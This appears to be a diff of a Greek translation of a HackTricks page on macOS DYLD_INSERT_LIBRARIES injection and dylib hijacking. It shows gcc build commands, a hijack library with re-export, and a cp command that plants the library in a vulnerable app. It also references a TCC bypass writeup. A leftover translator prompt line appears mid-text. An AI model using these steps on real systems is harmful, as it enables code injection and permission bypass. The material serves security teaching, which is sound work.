@@ -2,9 +2,9 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## Βασικό παράδειγμα DYLD_INSERT_LIBRARIES
+## DYLD_INSERT_LIBRARIES Βασικό παράδειγμα
 
-**Library για injection** για την εκτέλεση ενός shell:
+**Library προς injection** για την εκτέλεση ενός shell:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -66,7 +66,7 @@ path @loader_path/../lib2 (offset 12)
 
 {{#tab name="@rpath"}}
 ```bash
-# Check librareis loaded using @rapth and the used versions
+# Check libraries loaded using @rpath and the versions used
 otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
 name @rpath/lib.dylib (offset 24)
 time stamp 2 Thu Jan  1 01:00:02 1970
@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Με τις προηγούμενες πληροφορίες γνωρίζουμε ότι **δεν ελέγχει την υπογραφή των φορτωμένων libraries** και **προσπαθεί να φορτώσει μια library από**:
+Με τις προηγούμενες πληροφορίες γνωρίζουμε ότι **δεν ελέγχει την υπογραφή των φορτωμένων βιβλιοθηκών** και **προσπαθεί να φορτώσει μια βιβλιοθήκη από**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Επομένως, είναι δυνατό να πραγματοποιηθεί hijack! Δημιούργησε μια library που **εκτελεί κάποιο arbitrary code και εξάγει τις ίδιες λειτουργίες** με τη legit library, κάνοντας reexport της. Και θυμήσου να την κάνεις compile με τις αναμενόμενες versions:
+Επομένως, είναι δυνατή η hijack του! Δημιούργησε μια library που **εκτελεί κάποιο arbitrary code και κάνει export τις ίδιες functionalities** με τη legit library, κάνοντάς την reexport. Και θυμήσου να την κάνεις compile με τις αναμενόμενες versions:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,7 +99,7 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-Παρακαλώ επικολλήστε το αγγλικό κείμενο που θέλετε να μεταφράσω.
+Παρακαλώ επικολλήστε το περιεχόμενο προς μετάφραση.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
@@ -121,7 +121,7 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Τέλος, απλώς αντιγράψτε το στη **τοποθεσία που έχει γίνει hijack**:
+Τέλος, απλώς αντιγράψτε το στη **παραβιασμένη τοποθεσία**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
@@ -133,16 +133,15 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 </code></pre>
 
 > [!TIP]
-> Ένα ωραίο writeup σχετικά με το πώς μπορεί να γίνει abuse αυτής της ευπάθειας για την παράκαμψη των δικαιωμάτων camera του telegram μπορείτε να βρείτε στο [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
+> Ένα χρήσιμο writeup σχετικά με το πώς μπορεί να γίνει abuse αυτής της ευπάθειας για την παράκαμψη των camera permissions του telegram υπάρχει στο [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
 
 ## Μεγαλύτερη κλίμακα
 
-Αν σκοπεύετε να δοκιμάσετε να κάνετε inject libraries σε απρόβλεπτα binaries, μπορείτε να ελέγξετε τα event messages για να διαπιστώσετε πότε φορτώνεται η library μέσα σε μια process (σε αυτή την περίπτωση αφαιρέστε το printf και την εκτέλεση του `/bin/bash`).
+Αν σχεδιάζετε να δοκιμάσετε να κάνετε inject libraries σε μη αναμενόμενα binaries, μπορείτε να ελέγξετε τα event messages για να διαπιστώσετε πότε η library φορτώνεται μέσα σε ένα process (σε αυτήν την περίπτωση αφαιρέστε το printf και την εκτέλεση του `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
-## Αναφορές
+## References
 
 - [1] [CVE-2023-26818 - Παράκαμψη του TCC με το Telegram στο macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
-
 {{#include ../../../../banners/hacktricks-training.md}}
